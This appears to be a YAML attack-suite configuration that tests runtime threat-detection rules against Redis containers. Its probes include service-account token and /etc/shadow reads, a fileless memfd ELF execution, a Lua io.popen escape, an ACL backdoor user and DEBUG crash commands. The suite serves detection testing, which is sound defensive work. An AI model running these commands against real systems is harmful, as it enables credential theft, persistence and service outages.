apiVersion: bobctl.k8sstormcenter.io/v1alpha1
kind: AttackSuite
metadata:
  name: redis-distro-killchain
  description: >-
    Identical attack surface applied to every redis-protocol distro under
    comparison. Protocol-native probes plus the standard rule-family sweep, so
    any difference in what fires is a property of the implementation and not of
    the suite.
target:
  service: redis
  namespace: redis-oss
  port: 6379
  protocol: redis

attacks:
  - name: recon-info-server
    type: custom
    redis: { command: ["INFO", "server"] }
    successIndicators: [{ responseContains: "redis_version" }]
    expectedDetections: []
  - name: recon-config-dump
    type: custom
    redis: { command: ["CONFIG", "GET", "*"] }
    expectedDetections: []
  - name: recon-client-list
    type: custom
    redis: { command: ["CLIENT", "LIST"] }
    expectedDetections: []
  - name: exec-whoami
    type: cmdinject
    exec: { command: ["sh", "-c", "id -u >/dev/null 2>&1 && echo whoami_done"] }
    successIndicators: [{ responseContains: "whoami_done" }]
    expectedDetections:
      - { ruleID: R0001, ruleName: Unexpected process launched, containerName: redis, command: sh }

  # ── Full rule-family sweep (scripts/emit-rule-sweep.py) ─────────────────────
  # Primitives probed on the live container: staging dir, real mount, interpreter.
  # Anything that misses on the dogfood run must be demoted to a probe WITH a reason.
  - name: dns-anomaly-lookup
    type: cmdinject
    exec: { command: ["sh", "-c", "getent hosts scanner.evil-c2.example.com >/dev/null 2>&1 && echo dns_resolved || echo dns_attempted"] }
    successIndicators: [{ responseContains: "dns_" }]
    expectedDetections:
      - { ruleID: R0005, ruleName: DNS Anomalies in container, containerName: redis }
  - name: sa-token-read
    type: cmdinject
    exec: { command: ["sh", "-c", "cat /var/run/secrets/kubernetes.io/serviceaccount/token >/dev/null 2>&1 && echo sa_token_read_done || echo sa_token_absent"] }
    successIndicators: [{ responseContains: "sa_token_read_done" }]
    expectedDetections:
      - { ruleID: R0006, ruleName: Unexpected service account token access, containerName: redis, command: cat }
  - name: k8s-api-unexpected-call
    type: cmdinject
    exec: { command: ["perl", "-e", "use Socket; socket(my $s,PF_INET,SOCK_STREAM,getprotobyname('tcp')); connect($s,sockaddr_in(443,inet_aton('10.43.0.1'))); close($s); print qq{k8s_api_probe_done}"] }
    successIndicators: [{ responseContains: "k8s_api_probe_done" }]
    expectedDetections:
      - { ruleID: R0007, ruleName: Workload uses Kubernetes API unexpectedly, containerName: redis }
  - name: exec-proc-environ
    type: cmdinject
    exec: { command: ["cat", "/proc/1/environ"] }
    successIndicators: [{ responseContains: "PATH" }]
    expectedDetections:
      - { ruleID: R0008, ruleName: Read Environment Variables from procfs, containerName: redis, command: cat }
  - name: exec-etc-shadow
    type: cmdinject
    exec: { command: ["cat", "/etc/shadow"] }
    expectedDetections:
      - { ruleID: R0010, ruleName: Unexpected Sensitive File Access, containerName: redis, command: cat }
  - name: egress-external-c2
    type: cmdinject
    exec: { command: ["perl", "-e", "use Socket; socket(my $s,PF_INET,SOCK_STREAM,getprotobyname('tcp')); connect($s,sockaddr_in(80,inet_aton('1.1.1.1'))); close($s); print qq{egress_attempted}"] }
    successIndicators: [{ responseContains: "egress_attempted" }]
    expectedDetections:
      - { ruleID: R0011, ruleName: Unexpected Egress Network Traffic, containerName: redis }
  - name: drifted-binary-exec
    type: cmdinject
    exec: { command: ["sh", "-c", "cp /bin/ls /data/drifted_bob && printf '\\n#bob-drift' >> /data/drifted_bob && chmod +x /data/drifted_bob && /data/drifted_bob / >/dev/null 2>&1 && echo drift_exec_done; rm -f /data/drifted_bob"] }
    successIndicators: [{ responseContains: "drift_exec_done" }]
    expectedDetections:
      - { ruleID: R1000, ruleName: Process executed from malicious source, containerName: redis }
  - name: exec-from-volume-mount
    type: cmdinject
    exec: { command: ["sh", "-c", "cp /bin/echo /data/mnt_payload && chmod +x /data/mnt_payload && /data/mnt_payload mount_exec_done; rm -f /data/mnt_payload"] }
    successIndicators: [{ responseContains: "mount_exec_done" }]
    expectedDetections:
      - { ruleID: R1004, ruleName: Process executed from mount, containerName: redis }
  - name: fileless-memfd-exec
    type: fileless
    # Self-contained: an embedded 173-byte static ELF (writes a marker, exits) is
    # written straight into an anonymous memfd and execve'd. No victim-container
    # binary (/bin/cat, /bin/echo) needed - works on distroless images. Needs only
    # a syscall-capable runtime (python3; perl+MIME::Base64 is an alternative).
    exec:
      command:
        - "sh"
        - "-c"
        - >-
          python3 -c "import ctypes,os,base64;e=base64.b64decode('f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAFAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAArQAAAAAAAACtAAAAAAAAAAAQAAAAAAAAuAEAAAC/AQAAAEiNNRAAAAC6FAAAAA8FuDwAAAAx/w8FUjEwMDVfZmlsZWxlc3NfZXhlYwo=');l=ctypes.CDLL(None);fd=l.syscall(319,b'm',0);os.write(fd,e);os.execv('/proc/self/fd/%d'%fd,['m'])" 2>/dev/null || echo fileless_unavailable
    successIndicators: [{ responseContains: "R1005_fileless_exec" }]
    expectedDetections:
      - { ruleID: R1005, ruleName: Fileless execution detected, containerName: redis }
  - name: crypto-mining-dns
    type: cmdinject
    exec: { command: ["sh", "-c", "getent hosts xmr.pool.minergate.com >/dev/null 2>&1 && echo miner_dns_ok || echo miner_dns_attempted"] }
    successIndicators: [{ responseContains: "miner_dns_" }]
    expectedDetections:
      - { ruleID: R1008, ruleName: Crypto Mining Domain Communication, containerName: redis }
  - name: symlink-shadow
    type: cmdinject
    exec: { command: ["ln", "-sf", "/etc/shadow", "/data/softlink_probe"] }
    successIndicators: [{ responseContains: "" }]
    expectedDetections:
      - { ruleID: R1010, ruleName: Soft link created over sensitive file, containerName: redis, command: ln }
  - name: hardlink-shadow
    type: cmdinject
    exec: { command: ["sh", "-c", "ln /etc/shadow /data/hl_probe >/dev/null 2>&1 && echo hardlink_done; rm -f /data/hl_probe"] }
    successIndicators: [{ responseContains: "hardlink_done" }]
    expectedDetections:
      - { ruleID: R1012, ruleName: Hard link created over sensitive file, containerName: redis, command: ln }

  # ══ UNION additions: CVE classes the suite above does not yet cover ═════════
  # ACL/DEBUG attacks require the distro to run with --enable-debug-command yes;
  # Lua RCE only spawns on a vulnerable Lua build.
  - name: lua-sandbox-escape-popen
    type: custom
    redis: { command: ["EVAL", "local h=io.popen('id');local r=h:read('*a');h:close();return r", "0"] }
    successIndicators: [{ responseContains: "uid=" }]
    expectedDetections:
      - { ruleID: R0001, ruleName: Unexpected process launched, containerName: redis }
  - name: container-escape-unshare
    type: cmdinject
    exec: { command: ["sh", "-c", "unshare -Urm true 2>/dev/null && echo escape_ok || echo escape_blocked"] }
    successIndicators: [{ responseContains: "escape_" }]
    expectedDetections:
      - { ruleID: R1006, ruleName: Process tries to escape container, containerName: redis }
  - name: acl-backdoor-setuser
    type: custom
    redis: { command: ["ACL", "SETUSER", "bobbackdoor", "on", ">p", "~*", "+@all"] }
    successIndicators: [{ responseContains: "OK" }]
    expectedDetections: []
  - name: dos-debug-sleep
    type: custom
    redis: { command: ["DEBUG", "SLEEP", "2"] }
    successIndicators: [{ responseContains: "OK" }]
    expectedDetections: []
  - name: crash-debug-segfault
    type: custom
    redis: { command: ["DEBUG", "SEGFAULT"] }
    successIndicators: []
    expectedDetections: []
